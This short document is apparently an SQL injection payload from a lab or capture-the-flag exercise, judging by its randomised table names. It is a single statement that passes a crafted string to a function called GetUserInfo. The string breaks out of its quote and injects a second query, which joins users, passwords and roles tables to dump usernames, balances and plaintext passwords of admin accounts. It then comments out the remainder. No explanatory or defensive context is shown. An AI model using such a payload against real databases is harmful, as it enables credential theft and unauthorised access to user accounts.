select * from GetUserInfo(' ''''; 
select t1.username, t1.balance, t2.password, t1.visible, t1.YzNaYONpzT 
from users_sTtFVc as t1 
	join passwords_sTtFVc as t2 
on t1.username=t2.username 
	join roles_sTtFVc as t3 
on md5(t2.username)=t3.mHash 
     where t3.role=''admin''--');


